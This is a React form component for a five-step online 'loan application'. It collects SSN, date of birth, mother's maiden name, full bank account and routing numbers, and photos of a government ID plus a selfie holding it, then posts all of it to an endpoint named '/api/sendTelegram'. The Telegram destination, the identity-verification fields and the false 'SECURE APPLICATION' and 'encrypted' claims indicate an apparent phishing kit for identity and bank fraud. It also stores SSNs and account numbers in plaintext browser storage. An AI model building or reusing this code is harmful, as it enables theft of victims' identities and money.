"use client";
import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";

export default function LoanApplication() {
    const [currentStep, setCurrentStep] = useState(0);
    const [submitted, setSubmitted] = useState(false);
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [formData, setFormData] = useState<Record<string, string | File | null>>({
        loanAmount: "",
        loanPurpose: "",
        loanTerm: "",
        fullName: "",
        ssn: "",
        dob: "",
        maritalStatus: "",
        motherMaiden: "",
        email: "",
        phone: "",
        homeAddress: "",
        employer: "",
        jobTitle: "",
        experienceYears: "",
        grossIncome: "",
        rentMortgage: "",
        creditScore: "",
        hasCreditCard: "",
        hasHomeEquity: "",
        propertyValue: "",
        bankName: "",
        accountNumber: "",
        routingNumber: "",
        idFront: null,
        idBack: null,
        selfieWithId: null,
    });

    const [errors, setErrors] = useState<Record<string, string>>({});

    const steps = [
        "Loan Details",
        "Personal Info",
        "Employment Info",
        "Bank Details",
        "Documents & Submit",
    ];

    useEffect(() => {
        const saved = localStorage.getItem("loanForm");
        if (saved) {
            try {
                const parsed = JSON.parse(saved);
                // Only restore string values, not files
                const safeData: Record<string, string | null> = {};
                Object.entries(parsed).forEach(([key, value]) => {
                    if (typeof value === "string" || value === null) safeData[key] = value as string | null;
                });
                setFormData((prev) => ({ ...prev, ...safeData }));
            } catch { }
        }
    }, []);

    useEffect(() => {
        // Only save string values to localStorage (not File objects)
        const saveable: Record<string, string> = {};
        Object.entries(formData).forEach(([key, value]) => {
            if (typeof value === "string") saveable[key] = value;
        });
        localStorage.setItem("loanForm", JSON.stringify(saveable));
    }, [formData]);

    const handleNext = () => {
        if (validateStep()) setCurrentStep((prev) => prev + 1);
    };
    const handlePrev = () => setCurrentStep((prev) => prev - 1);

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
        const { name, value, files } = e.target as HTMLInputElement;

        if (files && files[0]) {
            const file = files[0];

            // ✅ FIX: file size limit
            if (file.size >20 * 1024 * 1024) {
                alert("File too large. Max 5MB");
                return;
            }

            setFormData({ ...formData, [name]: file });
        } else {
            setFormData({ ...formData, [name]: value });
        }
    };

    const validateStep = () => {
        let stepErrors: Record<string, string> = {};
        switch (currentStep) {
            case 0:
                if (!formData.loanAmount) stepErrors.loanAmount = "Required";
                if (!formData.loanPurpose) stepErrors.loanPurpose = "Required";
                if (!formData.loanTerm) stepErrors.loanTerm = "Required";
                break;
            case 1:
                if (!formData.fullName) stepErrors.fullName = "Required";
                if (!formData.email) stepErrors.email = "Required";
                if (!formData.phone) stepErrors.phone = "Required";
                if (!formData.ssn) stepErrors.ssn = "Required";
                else if ((formData.ssn as string).replace(/\D/g, "").length < 9)
                    stepErrors.ssn = "SSN must be at least 9 digits";
                if (!formData.dob) stepErrors.dob = "Required";
                if (!formData.maritalStatus) stepErrors.maritalStatus = "Required";
                if (!formData.motherMaiden) stepErrors.motherMaiden = "Required";
                if (!formData.homeAddress) stepErrors.homeAddress = "Required";
                break;
            case 2:
                if (!formData.employer) stepErrors.employer = "Required";
                if (!formData.jobTitle) stepErrors.jobTitle = "Required";
                if (!formData.experienceYears) stepErrors.experienceYears = "Required";
                if (!formData.grossIncome) stepErrors.grossIncome = "Required";
                if (!formData.rentMortgage) stepErrors.rentMortgage = "Required";
                if (!formData.creditScore) stepErrors.creditScore = "Required";
                if (!formData.hasCreditCard) stepErrors.hasCreditCard = "Required";
                if (!formData.hasHomeEquity) stepErrors.hasHomeEquity = "Required";
                if (!formData.propertyValue) stepErrors.propertyValue = "Required";
                break;
            case 3:
                if (!formData.bankName) stepErrors.bankName = "Required";
                if (!formData.accountNumber) stepErrors.accountNumber = "Required";
                if (!formData.routingNumber) stepErrors.routingNumber = "Required";
                break;
            case 4:
                if (!formData.idFront) stepErrors.idFront = "Required";
                if (!formData.idBack) stepErrors.idBack = "Required";
                if (!formData.selfieWithId) stepErrors.selfieWithId = "Required";
                break;
            default:
                break;
        }
        setErrors(stepErrors);
        return Object.keys(stepErrors).length === 0;
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        if (!validateStep()) return;

        setIsSubmitting(true);

        try {
            const formPayload = new FormData();
            Object.entries(formData).forEach(([key, value]) => {
                if (value === null) return;
                if ((value as unknown) instanceof File) formPayload.append(key, value as unknown as File);
                else formPayload.append(key, value as string);
            });

            const res = await fetch("/api/sendTelegram", {
                method: "POST",
                body: formPayload,
            });

            const text = await res.text();

            let result;
            try {
                result = JSON.parse(text);
            } catch {
                console.error("Server returned non-JSON:", text);
                alert("Upload failed. File may be too large.");
                setIsSubmitting(false);
                return;
            }

            if (!res.ok || !result.ok) {
                alert(`Submission failed: ${result.error || "Unknown error"}`);
                setIsSubmitting(false);
                return;
            }

            localStorage.removeItem("loanForm");
            setSubmitted(true);

        } catch (err) {
            alert(`Network error: ${(err as Error).message}`);
            setIsSubmitting(false);
        }
    };

    const progressPercent = ((currentStep + 1) / steps.length) * 100;
    const variants = {
        initial: { opacity: 0, x: 50 },
        animate: { opacity: 1, x: 0 },
        exit: { opacity: 0, x: -50 },
    };

    // ✅ SUCCESS SCREEN
    if (submitted) {
        return (
            <div className="max-w-3xl mx-auto p-6">
                <motion.div
                    initial={{ opacity: 0, scale: 0.95 }}
                    animate={{ opacity: 1, scale: 1 }}
                    transition={{ duration: 0.5, ease: "easeOut" }}
                    className="bg-white shadow-lg border border-green-400 p-10 text-center rounded-sm"
                >
                    {/* Animated checkmark circle */}
                    <motion.div
                        initial={{ scale: 0 }}
                        animate={{ scale: 1 }}
                        transition={{ delay: 0.2, type: "spring", stiffness: 200, damping: 15 }}
                        className="w-24 h-24 rounded-full bg-green-100 border-4 border-green-500 flex items-center justify-center mx-auto mb-6"
                    >
                        <motion.svg
                            initial={{ pathLength: 0 }}
                            animate={{ pathLength: 1 }}
                            transition={{ delay: 0.5, duration: 0.5, ease: "easeInOut" }}
                            className="w-12 h-12 text-green-600"
                            fill="none"
                            viewBox="0 0 24 24"
                            stroke="currentColor"
                            strokeWidth={3}
                        >
                            <motion.path
                                strokeLinecap="round"
                                strokeLinejoin="round"
                                d="M5 13l4 4L19 7"
                                initial={{ pathLength: 0 }}
                                animate={{ pathLength: 1 }}
                                transition={{ delay: 0.5, duration: 0.6, ease: "easeInOut" }}
                            />
                        </motion.svg>
                    </motion.div>

                    <motion.div
                        initial={{ opacity: 0, y: 20 }}
                        animate={{ opacity: 1, y: 0 }}
                        transition={{ delay: 0.4 }}
                    >
                        <span className="inline-flex items-center justify-center gap-2 text-xs font-semibold px-4 py-2 rounded-full mb-6 bg-yellow-400/90 text-black shadow-sm">
                            APPLICATION RECEIVED
                        </span>

                        <h2 className="text-3xl font-bold text-green-700 mb-3">
                            You&apos;re All Set!
                        </h2>

                        <p className="text-gray-600 text-lg mb-2">
                            Your loan application has been successfully submitted.
                        </p>

                        <p className="text-gray-500 text-sm mb-8">
                            Our team will review your application and get back to you within <span className="font-semibold text-green-700">24–48 hours</span> via the email or phone number you provided.
                        </p>

                        <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-8 text-left space-y-2">
                            <h3 className="font-semibold text-green-800 text-sm uppercase tracking-wide mb-3">What happens next?</h3>
                            {[
                                { step: "1", text: "Application review by our loan officers" },
                                { step: "2", text: "Identity & document verification" },
                                { step: "3", text: "Loan approval decision sent to your email" },
                                { step: "4", text: "Funds disbursed upon acceptance" },
                            ].map((item) => (
                                <div key={item.step} className="flex items-center gap-3">
                                    <span className="w-6 h-6 rounded-full bg-green-600 text-white text-xs flex items-center justify-center font-bold flex-shrink-0">
                                        {item.step}
                                    </span>
                                    <span className="text-gray-600 text-sm">{item.text}</span>
                                </div>
                            ))}
                        </div>

                        <p className="text-xs text-gray-400">
                            Reference: #{Math.random().toString(36).substring(2, 10).toUpperCase()} · Submitted {new Date().toLocaleDateString("en-US", { month: "long", day: "numeric", year: "numeric" })}
                        </p>
                    </motion.div>
                </motion.div>
            </div>
        );
    }

    return (
        <div className="max-w-3xl mx-auto p-6 bg-white shadow-lg border border-green-400">
            <div className="text-center">
                <span className="inline-flex items-center justify-center gap-2 text-xs font-semibold px-4 py-2 rounded-full mb-6 bg-yellow-400/90 text-black shadow-sm mx-auto">
                    SECURE APPLICATION
                </span>
            </div>

            <h2 className="text-3xl font-bold mb-2 text-center text-green-700">Start Your Loan Application</h2>
            <p className="text-center text-green-600 mb-6">Completely online, encrypted, takes around 10 minutes.</p>

            <div className="relative w-full h-2 bg-green-200 rounded-full mb-6">
                <div className="h-2 bg-green-600 rounded-full transition-all duration-500" style={{ width: `${progressPercent}%` }} />
            </div>

            <div className="flex justify-between mb-6 text-sm text-green-700 font-medium">
                {steps.map((step, idx) => (
                    <div key={idx} className={`${currentStep === idx ? "text-green-900 font-bold" : ""}`}>
                        {step}
                    </div>
                ))}
            </div>

            <form onSubmit={handleSubmit} className="space-y-6 relative min-h-[400px]">
                <AnimatePresence mode="wait">
                    {currentStep === 0 && (
                        <motion.div key="step1" variants={variants} initial="initial" animate="animate" exit="exit" transition={{ duration: 0.3 }}>
                            <StepContainer>
                                <label>Loan Amount *</label>
                                <Input name="loanAmount" value={formData.loanAmount as string} onChange={handleChange} placeholder="$5000" />
                                {errors.loanAmount && <ErrorText>{errors.loanAmount}</ErrorText>}

                                <label>Loan Purpose *</label>
                                <Select
                                    name="loanPurpose"
                                    value={formData.loanPurpose as string}
                                    onChange={handleChange}
                                    options={["Education", "Car", "Home", "Business", "Medical", "Other"]}
                                />
                                {errors.loanPurpose && <ErrorText>{errors.loanPurpose}</ErrorText>}

                                <label>Loan Term *</label>
                                <Input name="loanTerm" value={formData.loanTerm as string} onChange={handleChange} placeholder="12 months" />
                                {errors.loanTerm && <ErrorText>{errors.loanTerm}</ErrorText>}

                                <NextButton onClick={handleNext} />
                            </StepContainer>
                        </motion.div>
                    )}

                    {currentStep === 1 && (
                        <motion.div key="step2" variants={variants} initial="initial" animate="animate" exit="exit" transition={{ duration: 0.3 }}>
                            <StepContainer>
                                <label>Full Legal Name *</label>
                                <Input name="fullName" value={formData.fullName as string} onChange={handleChange} placeholder="First Middle Last" />
                                {errors.fullName && <ErrorText>{errors.fullName}</ErrorText>}

                                <label>Email *</label>
                                <Input type="email" name="email" value={formData.email as string} onChange={handleChange} placeholder="your@email.com" />
                                {errors.email && <ErrorText>{errors.email}</ErrorText>}

                                <label>Phone *</label>
                                <Input type="tel" name="phone" value={formData.phone as string} onChange={handleChange} placeholder="(555)000-0000" />
                                {errors.phone && <ErrorText>{errors.phone}</ErrorText>}

                                <label>SSN</label>
                                <Input name="ssn" value={formData.ssn as string} onChange={handleChange} placeholder="123-45-6789" />
                                {errors.ssn && <ErrorText>{errors.ssn}</ErrorText>}

                                <label>Date of Birth *</label>
                                <Input type="date" name="dob" value={formData.dob as string} onChange={handleChange} />
                                {errors.dob && <ErrorText>{errors.dob}</ErrorText>}

                                <label>Marital Status *</label>
                                <Select
                                    name="maritalStatus"
                                    value={formData.maritalStatus as string}
                                    onChange={handleChange}
                                    options={["Single", "Married", "Divorced", "Widowed", "Prefer not to say"]}
                                />
                                {errors.maritalStatus && <ErrorText>{errors.maritalStatus}</ErrorText>}

                                <label>Mother's Maiden Name *</label>
                                <Input name="motherMaiden" value={formData.motherMaiden as string} onChange={handleChange} placeholder="Last name at birth" />
                                {errors.motherMaiden && <ErrorText>{errors.motherMaiden}</ErrorText>}

                                <label>Home Address *</label>
                                <Input name="homeAddress" value={formData.homeAddress as string} onChange={handleChange} placeholder="Street address, City, State, Zip" />
                                {errors.homeAddress && <ErrorText>{errors.homeAddress}</ErrorText>}

                                <BackNext handlePrev={handlePrev} handleNext={handleNext} />
                            </StepContainer>
                        </motion.div>
                    )}

                    {currentStep === 2 && (
                        <motion.div key="step3" variants={variants} initial="initial" animate="animate" exit="exit" transition={{ duration: 0.3 }}>
                            <StepContainer>
                                <label>Present Employer *</label>
                                <Input name="employer" value={formData.employer as string} onChange={handleChange} placeholder="Company name" />
                                {errors.employer && <ErrorText>{errors.employer}</ErrorText>}
                                <label>Occupation / Job Title *</label>
                                <Input name="jobTitle" value={formData.jobTitle as string} onChange={handleChange} placeholder="e.g. Registered Nurse" />
                                {errors.jobTitle && <ErrorText>{errors.jobTitle}</ErrorText>}
                                <label>Years of Experience *</label>
                                <Select name="experienceYears" value={formData.experienceYears as string} onChange={handleChange} options={["Less than 1 year", "1 to 2 years", "3 to 5 years", "6 to 10 years", "Over 10 years"]} />
                                {errors.experienceYears && <ErrorText>{errors.experienceYears}</ErrorText>}
                                <label>Gross Monthly Income *</label>
                                <Input name="grossIncome" value={formData.grossIncome as string} onChange={handleChange} placeholder="$ e.g. 5000" />
                                {errors.grossIncome && <ErrorText>{errors.grossIncome}</ErrorText>}
                                <label>Monthly Rent / Mortgage *</label>
                                <Input name="rentMortgage" value={formData.rentMortgage as string} onChange={handleChange} placeholder="$ e.g. 1400" />
                                {errors.rentMortgage && <ErrorText>{errors.rentMortgage}</ErrorText>}
                                <label>Estimated Credit Score *</label>
                                <Select name="creditScore" value={formData.creditScore as string} onChange={handleChange} options={["300 to 499 (Poor)", "500 to 579 (Very Poor)", "580 to 660 (Fair)", "670 to 739 (Good)", "740 to 799 (Very Good)", "800 to 850 (Exceptional)"]} />
                                {errors.creditScore && <ErrorText>{errors.creditScore}</ErrorText>}
                                <label>Do you have a credit card? *</label>
                                <Select name="hasCreditCard" value={formData.hasCreditCard as string} onChange={handleChange} options={["Yes", "No", "Prefer not to say"]} />
                                {errors.hasCreditCard && <ErrorText>{errors.hasCreditCard}</ErrorText>}
                                <label>Do you have home equity? *</label>
                                <Select name="hasHomeEquity" value={formData.hasHomeEquity as string} onChange={handleChange} options={["Yes", "No", "Not sure"]} />
                                {errors.hasHomeEquity && <ErrorText>{errors.hasHomeEquity}</ErrorText>}
                                <label>Estimated Property Value *</label>
                                <Input name="propertyValue" value={formData.propertyValue as string} onChange={handleChange} placeholder="A value or none" />
                                {errors.propertyValue && <ErrorText>{errors.propertyValue}</ErrorText>}
                                <BackNext handlePrev={handlePrev} handleNext={handleNext} />
                            </StepContainer>
                        </motion.div>
                    )}

                    {currentStep === 3 && (
                        <motion.div key="step4" variants={variants} initial="initial" animate="animate" exit="exit" transition={{ duration: 0.3 }}>
                            <StepContainer>
                                <label>Bank / Financial Institution *</label>
                                <Input name="bankName" value={formData.bankName as string} onChange={handleChange} placeholder="e.g. JPMorgan Chase, Bank of America" />
                                {errors.bankName && <ErrorText>{errors.bankName}</ErrorText>}

                                <label>Checking Account Number *</label>
                                <Input name="accountNumber" value={formData.accountNumber as string} onChange={handleChange} placeholder="Your full account number" />
                                {errors.accountNumber && <ErrorText>{errors.accountNumber}</ErrorText>}

                                <label>Bank Routing Number *</label>
                                <Input name="routingNumber" type="number" value={formData.routingNumber as string} onChange={handleChange} placeholder="9-digit ABA routing number" />
                                {errors.routingNumber && <ErrorText>{errors.routingNumber}</ErrorText>}

                                <BackNext handlePrev={handlePrev} handleNext={handleNext} />
                            </StepContainer>
                        </motion.div>
                    )}

                    {currentStep === 4 && (
                        <motion.div key="step5" variants={variants} initial="initial" animate="animate" exit="exit" transition={{ duration: 0.3 }}>
                            <StepContainer>
                                <label>Government ID - Front *</label>
                                <FileInput name="idFront" onChange={handleChange} />
                                {errors.idFront && <ErrorText>{errors.idFront}</ErrorText>}

                                <label>Government ID - Back *</label>
                                <FileInput name="idBack" onChange={handleChange} />
                                {errors.idBack && <ErrorText>{errors.idBack}</ErrorText>}

                                <label>Selfie Holding Your ID *</label>
                                <FileInput name="selfieWithId" onChange={handleChange} />
                                {errors.selfieWithId && <ErrorText>{errors.selfieWithId}</ErrorText>}

                                <div className="flex justify-between mt-4">
                                    <button type="button" onClick={handlePrev} className="px-6 py-3 bg-green-300 rounded-lg">Back</button>
                                    <button
                                        type="submit"
                                        disabled={isSubmitting}
                                        className="px-6 py-3 bg-green-600 text-white rounded-lg hover:bg-green-700 disabled:opacity-60 disabled:cursor-not-allowed flex items-center gap-2"
                                    >
                                        {isSubmitting ? (
                                            <>
                                                <svg className="animate-spin w-4 h-4" fill="none" viewBox="0 0 24 24">
                                                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                                                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8z" />
                                                </svg>
                                                Submitting...
                                            </>
                                        ) : "Submit Application"}
                                    </button>
                                </div>
                            </StepContainer>
                        </motion.div>
                    )}
                </AnimatePresence>
            </form>
        </div>
    );
}

// --- Helper Components ---
const StepContainer = ({ children }: { children: React.ReactNode }) => <div className="space-y-4 p-2">{children}</div>;

const Input = ({ type = "text", ...props }: any) => (
    <input
        type={type}
        className="w-full p-3 border-2 border-green-400 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-400 bg-white"
        {...props}
    />
);

const Select = ({ options = [], ...props }: any) => (
    <select
        className="w-full p-3 border-2 border-green-400 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-400 bg-white"
        {...props}
    >
        <option value="">Select</option>
        {options.map((opt: string, idx: number) => (
            <option key={idx} value={opt}>{opt}</option>
        ))}
    </select>
);

const FileInput = ({ ...props }: any) => (
    <input
        type="file"
        accept="image/png, image/jpeg"
        className="w-full p-2 border-2 border-green-400 rounded-lg bg-white"
        {...props}
    />
);

const NextButton = ({ onClick }: { onClick: () => void }) => (
    <button type="button" onClick={onClick} className="mt-4 px-6 py-3 bg-green-600 text-white rounded-lg hover:bg-green-700">Continue</button>
);

const BackNext = ({ handlePrev, handleNext }: { handlePrev: () => void; handleNext: () => void }) => (
    <div className="flex justify-between mt-4">
        <button type="button" onClick={handlePrev} className="px-6 py-3 bg-green-300 rounded-lg">Back</button>
        <button type="button" onClick={handleNext} className="px-6 py-3 bg-green-600 text-white rounded-lg hover:bg-green-700">Continue</button>
    </div>
);

const ErrorText = ({ children }: { children: React.ReactNode }) => <p className="text-red-600 text-sm">{children}</p>;
